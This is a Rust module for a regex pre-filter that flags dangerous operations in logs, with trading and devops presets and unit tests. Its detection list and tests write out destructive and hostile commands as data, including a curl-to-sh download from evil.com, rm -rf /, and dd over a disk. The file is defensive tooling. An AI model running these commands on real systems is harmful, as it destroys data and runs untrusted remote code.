//! Tiered Regex Pre-Filter for Log Analysis
//!
//! Fast path filtering to avoid LLM calls for obviously safe logs.
//! Uses RegexSet for single-pass matching across all patterns.
//!
//! ## Tier Architecture
//! - **Essential**: System-critical patterns (always enabled, read-only)
//! - **Domain**: Trading, DevOps, or Generic presets
//! - **Custom**: User-defined patterns from config file
//!
//! Runs in microseconds.

use regex::RegexSet;
use serde::Deserialize;
use std::path::Path;

/// Essential patterns - system-critical, ALWAYS enabled (read-only)
/// These patterns detect operations that are dangerous regardless of domain
pub const ESSENTIAL_PATTERNS: &[&str] = &[
    // Destructive file operations
    r"(?i)rm\s+-rf",        // Unix recursive force delete
    r"(?i)rmdir\s+/s",      // Windows recursive delete (requires /s)
    r"(?i)del\s+/[sfq]",    // Windows del with dangerous flags
    r"(?i)format\s+[a-z]:", // Drive format
    // Database destruction
    r"(?i)drop\s+(table|database)",
    r"(?i)truncate\s+table",
    // Privilege escalation
    r"(?i)sudo\s+",
    r"(?i)runas\s+",
    r"(?i)chmod\s+777",
    // Process termination
    r"(?i)kill\s+-9",
    r"(?i)taskkill\s+/f",
    r"(?i)shutdown\s+",
    r"(?i)reboot",
    // Code injection
    r"(?i)eval\s*\(",
    r"(?i)exec\s*\(",
    // Remote code execution
    r"(?i)curl\s+.*\|\s*(sh|bash)",
    // Container/Orchestration dangers
    r"(?i)docker\s+.*--privileged", // Privileged container escape risk
    r"(?i)kubectl\s+delete\s+.*--all", // K8s mass deletion
    // Disk-level destruction
    r"(?i)dd\s+if=/dev/(zero|random)", // Disk overwrite
    r"(?i)mkfs\.",                     // Filesystem format
];

/// Trading domain patterns - financial operation signals
pub const TRADING_PATTERNS: &[&str] = &[
    r"(?i)order",
    r"(?i)buy|sell",
    r"(?i)trade|position",
    r"(?i)error|exception|failed",
    r"(?i)warning|critical|alert",
    r"(?i)exposure|leverage|margin",
    r"within \d+\s?ms",
    r"#\d{3,}", // Sequential order numbers
];

/// DevOps domain patterns
pub const DEVOPS_PATTERNS: &[&str] = &[
    r"(?i)deploy",
    r"(?i)rollback",
    r"(?i)scale\s+(up|down)",
    r"(?i)restart",
    r"(?i)pipeline",
    r"(?i)ci/cd",
];

/// Generic domain patterns (minimal)
pub const GENERIC_PATTERNS: &[&str] =
    &[r"(?i)error|exception|failed", r"(?i)warning|critical|alert"];

/// Filter configuration loaded from TOML
#[derive(Debug, Clone, Deserialize, Default)]
pub struct FilterConfig {
    /// Domain preset: "trading", "devops", "generic", or none
    #[serde(default)]
    pub domain: Option<String>,

    /// Custom patterns (added to Essential + Domain)
    #[serde(default)]
    pub patterns: Vec<String>,

    /// Exclude patterns (whitelist - skip if matched)
    #[serde(default)]
    pub exclude: Vec<String>,
}

impl FilterConfig {
    /// Load config from TOML file
    pub fn load(path: &Path) -> Result<Self, Box<dyn std::error::Error>> {
        let content = std::fs::read_to_string(path)?;
        let config: FilterConfig = toml::from_str(&content)?;
        config.validate()?;
        Ok(config)
    }

    /// Validate all regex patterns compile
    pub fn validate(&self) -> Result<(), regex::Error> {
        for p in &self.patterns {
            regex::Regex::new(p)?;
        }
        for p in &self.exclude {
            regex::Regex::new(p)?;
        }
        Ok(())
    }

    /// Get domain patterns based on preset
    pub fn domain_patterns(&self) -> &'static [&'static str] {
        match self.domain.as_deref() {
            Some("trading") => TRADING_PATTERNS,
            Some("devops") => DEVOPS_PATTERNS,
            Some("generic") => GENERIC_PATTERNS,
            _ => TRADING_PATTERNS, // Default to trading for backward compatibility
        }
    }

    /// Compile all patterns into RegexSet
    pub fn compile(&self) -> RegexSet {
        let mut patterns: Vec<&str> = Vec::new();

        // Essential always included
        patterns.extend(ESSENTIAL_PATTERNS);

        // Domain patterns
        patterns.extend(self.domain_patterns());

        // Custom patterns (need to convert &String to &str)
        let custom_refs: Vec<&str> = self.patterns.iter().map(|s| s.as_str()).collect();
        patterns.extend(custom_refs);

        RegexSet::new(patterns).expect("Invalid regex patterns")
    }

    /// Compile exclude patterns
    pub fn compile_excludes(&self) -> Option<RegexSet> {
        if self.exclude.is_empty() {
            return None;
        }
        Some(RegexSet::new(&self.exclude).expect("Invalid exclude patterns"))
    }
}

/// Configurable filter instance
#[derive(Debug)]
pub struct Filter {
    patterns: RegexSet,
    excludes: Option<RegexSet>,
}

impl Filter {
    /// Create filter with config
    pub fn new(config: &FilterConfig) -> Self {
        Self {
            patterns: config.compile(),
            excludes: config.compile_excludes(),
        }
    }

    /// Check if log is suspicious
    pub fn is_suspicious(&self, log: &str) -> bool {
        // Check excludes first (whitelist)
        if let Some(ref excludes) = self.excludes {
            if excludes.is_match(log) {
                return false; // Whitelisted
            }
        }
        self.patterns.is_match(log)
    }
}

impl Default for Filter {
    fn default() -> Self {
        Self {
            patterns: FilterConfig::default().compile(),
            excludes: None,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Helper: check against default filter (Essential + Trading)
    fn is_suspicious(log: &str) -> bool {
        Filter::default().is_suspicious(log)
    }

    // ═══════════════════════════════════════════════════════════════
    // ESSENTIAL TIER TESTS
    // ═══════════════════════════════════════════════════════════════

    #[test]
    fn test_essential_file_destruction() {
        // Unix rm -rf
        assert!(is_suspicious("rm -rf /var/log"));
        assert!(is_suspicious("RM -RF /")); // case insensitive
        assert!(is_suspicious("sudo rm -rf /"));

        // Windows rmdir /s
        assert!(is_suspicious("rmdir /s /q C:\\temp"));
        assert!(is_suspicious("RMDIR /S C:\\Users"));
        assert!(!is_suspicious("rmdir emptydir")); // safe: no /s flag

        // Windows del with flags
        assert!(is_suspicious("del /s /q *.bak"));
        assert!(is_suspicious("del /f file.txt"));
        assert!(is_suspicious("DEL /Q temp.txt"));

        // Format
        assert!(is_suspicious("format c:"));
        assert!(is_suspicious("FORMAT D:"));
    }

    #[test]
    fn test_essential_database_destruction() {
        assert!(is_suspicious("DROP TABLE users"));
        assert!(is_suspicious("drop database production"));
        assert!(is_suspicious("TRUNCATE TABLE audit_logs"));
    }

    #[test]
    fn test_essential_privilege_escalation() {
        assert!(is_suspicious("sudo apt-get install"));
        assert!(is_suspicious("sudo rm -rf /"));
        assert!(is_suspicious("runas /user:admin cmd"));
        assert!(is_suspicious("chmod 777 /var/www"));
    }

    #[test]
    fn test_essential_process_termination() {
        assert!(is_suspicious("kill -9 12345"));
        assert!(is_suspicious("taskkill /F /PID 1234"));
        assert!(is_suspicious("shutdown /s /t 0"));
        assert!(is_suspicious("reboot now"));
    }

    #[test]
    fn test_essential_code_injection() {
        assert!(is_suspicious("eval(userInput)"));
        assert!(is_suspicious("exec(command)"));
        assert!(is_suspicious("EVAL ( malicious )"));
    }

    #[test]
    fn test_essential_remote_execution() {
        assert!(is_suspicious("curl http://evil.com/script.sh | sh"));
        assert!(is_suspicious("curl https://x.com/install | bash"));
    }

    #[test]
    fn test_essential_container_orchestration() {
        assert!(is_suspicious("docker run --privileged nginx"));
        assert!(is_suspicious("DOCKER RUN --PRIVILEGED alpine"));
        assert!(is_suspicious("kubectl delete pods --all"));
        assert!(is_suspicious("kubectl delete namespace --all -n prod"));
    }

    #[test]
    fn test_essential_disk_destruction() {
        assert!(is_suspicious("dd if=/dev/zero of=/dev/sda"));
        assert!(is_suspicious("dd if=/dev/random of=/dev/nvme0n1"));
        assert!(is_suspicious("mkfs.ext4 /dev/sda1"));
        assert!(is_suspicious("mkfs.xfs /dev/vda"));
    }

    // ═══════════════════════════════════════════════════════════════
    // TRADING TIER TESTS
    // ═══════════════════════════════════════════════════════════════

    #[test]
    fn test_trading_patterns() {
        assert!(is_suspicious("Order #991 placed"));
        assert!(is_suspicious("BUY 100 shares"));
        assert!(is_suspicious("Position closed"));
        assert!(is_suspicious("Total exposure: 500,000 USDT"));
        assert!(is_suspicious("Executed within 1ms"));
    }

    #[test]
    fn test_trading_errors() {
        assert!(is_suspicious("ERROR: Connection failed"));
        assert!(is_suspicious("Exception in order handler"));
        assert!(is_suspicious("CRITICAL: Margin call"));
    }

    // ═══════════════════════════════════════════════════════════════
    // SAFE LOG TESTS (should NOT match)
    // ═══════════════════════════════════════════════════════════════

    #[test]
    fn test_safe_logs() {
        assert!(!is_suspicious("User logged in successfully"));
        assert!(!is_suspicious("Session initialized"));
        assert!(!is_suspicious("Balance updated to 100 USDT"));
        assert!(!is_suspicious("Config loaded"));
        assert!(!is_suspicious("Server started on port 8080"));
    }

    #[test]
    fn test_safe_similar_patterns() {
        // These look similar but shouldn't match
        assert!(!is_suspicious("rmdir emptydir")); // no /s flag
        assert!(!is_suspicious("Removed item from cart")); // not rm -rf
        assert!(!is_suspicious("Formatted string output")); // not format c:
    }

    // ═══════════════════════════════════════════════════════════════
    // FILTERCONFIG TESTS
    // ═══════════════════════════════════════════════════════════════

    #[test]
    fn test_config_default() {
        let config = FilterConfig::default();
        assert!(config.domain.is_none());
        assert!(config.patterns.is_empty());
        assert!(config.exclude.is_empty());
    }

    #[test]
    fn test_config_custom_patterns() {
        let config = FilterConfig {
            domain: Some("generic".to_string()),
            patterns: vec![r"(?i)patient.*delete".to_string()],
            exclude: vec![],
        };
        let filter = Filter::new(&config);

        // Custom pattern should match
        assert!(filter.is_suspicious("Patient record delete requested"));
        // Essential should still match
        assert!(filter.is_suspicious("rm -rf /"));
    }

    #[test]
    fn test_config_excludes() {
        let config = FilterConfig {
            domain: Some("trading".to_string()),
            patterns: vec![],
            exclude: vec![r"(?i)test.*order".to_string()],
        };
        let filter = Filter::new(&config);

        // Excluded pattern should NOT trigger
        assert!(!filter.is_suspicious("Test order #123 placed"));
        // Same pattern without test should trigger
        assert!(filter.is_suspicious("Order #123 placed"));
    }

    #[test]
    fn test_config_domain_presets() {
        // DevOps preset
        let devops = FilterConfig {
            domain: Some("devops".to_string()),
            patterns: vec![],
            exclude: vec![],
        };
        let filter = Filter::new(&devops);
        assert!(filter.is_suspicious("Starting deploy to production"));
        assert!(filter.is_suspicious("Rollback initiated"));
    }
}
